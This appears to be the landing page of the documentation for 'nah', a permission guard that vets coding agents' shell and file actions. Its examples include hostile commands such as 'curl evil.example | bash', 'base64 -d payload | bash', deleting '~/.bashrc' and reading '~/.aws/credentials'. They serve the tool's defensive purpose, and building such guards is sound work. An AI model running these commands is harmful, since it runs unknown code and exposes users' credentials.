<style>.md-content h1 { display: none; }</style>

<p align="center">
  <img src="assets/logo.png" alt="nah" width="280" class="invertible">
</p>

<p align="center">
  <strong>Context aware safety guard for coding agents.</strong><br>
  Because allow and deny isn't enough.
</p>

---

## The problem

nah lets agents keep moving on safe work while stopping the actions that can
leak secrets, rewrite history, run unknown code, or escape the project.

A permissions layer should not slow you down. Boring safe actions should pass
automatically, ambiguous actions should ask, and obviously dangerous actions
should be blocked before damage is done.

Allow and deny at the tool level does not really scale once coding agents can
run real commands. Deleting a build artifact is fine; deleting a shell profile
is not the same thing. `git status` and `git push --force` should not be
treated like the same Git command.

`nah` classifies every guarded action by what it actually does using contextual
rules that run in milliseconds. For the ambiguous stuff, optionally route to an
LLM. Every decision is logged and inspectable. Works out of the box, configure
it how you want it.

`git push` — Sure.<br>
`git push --force` — **nah paused:** this can rewrite Git history.

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.

**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.

`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.

## Tested threat model

nah's pytest threat-model audit currently tracks **1,724 category coverage hits**
across **12 tested danger classes**.

The audit is strongest where agents are most dangerous: shell commands. It also
covers file, path, content, search, MCP, and guard-tampering protections.

| Layer | What is covered |
| --- | --- |
| Shell command safety | Unknown code execution, `curl | bash`, nested shells, command substitution, redirects, wrappers, `xargs`, Git rewrites, package installs, destructive container commands |
| File and path safety | Sensitive files, SSH keys, `.env`, cloud credentials, symlinks, writes outside the project |
| Content inspection | Private keys, tokens, destructive code patterns, credential-search patterns |
| Agent and MCP permissions | Third-party MCP tools, browser/database action types, unknown agent tools |
| Guard self-protection | Attempts to edit nah hooks, config, runtime settings, and robustness paths |

Run it yourself:

```bash
nah audit-threat-model --format summary
```

See the full [threat model](threat-model.md) for runtime coverage and audit
semantics.

## How it works

`nah` classifies every guarded action by what it actually does using contextual
rules that run in milliseconds.

- **Taxonomy** maps actions to safety types like `git_history_rewrite`,
  `network_outbound`, `filesystem_delete`, and `lang_exec`.
- **Context** checks project root, trusted paths, sensitive files, command
  composition, target runtime, network hosts, and database targets.
- **Custom classifiers** let you teach nah your own commands and tools without
  maintaining fragile deny lists.
- **Intent and LLM review** can help with eligible ambiguous cases where the
  runtime exposes useful context. Deterministic blocks cannot be relaxed.

Every decision is logged and inspectable. Works out of the box, configure it how
you want it.

## Quick install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

Then connect the runtime you want to protect: [`nah run claude`](runtimes/claude-code.md)
for Claude Code, [`nah run codex`](runtimes/codex.md) for local Codex sessions,
or [`nah install bash`](runtimes/terminal-guard.md) /
[`nah install zsh`](runtimes/terminal-guard.md) for commands you type yourself.

The Claude Code plugin is still available for Claude-only installs without the
`nah` CLI. See [Claude Code](runtimes/claude-code.md#plugin-only-path).

**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.

## What it guards

| Surface | Coverage |
| --- | --- |
| [Claude Code](runtimes/claude-code.md) | Bash, file, search, notebook, and MCP tool calls before execution |
| [Codex](runtimes/codex.md) | Local interactive Bash, MCP, and `apply_patch` permission requests |
| [Your shell](runtimes/terminal-guard.md) | Commands you type yourself in guarded bash/zsh sessions |

See [How it works](how-it-works.md) for detailed tool coverage and classifier
behavior, and [Threat model](threat-model.md) for audited coverage.

---

[Install](install.md) | [Runtimes](runtimes/claude-code.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Threat model](threat-model.md) | [Privacy](privacy.md)
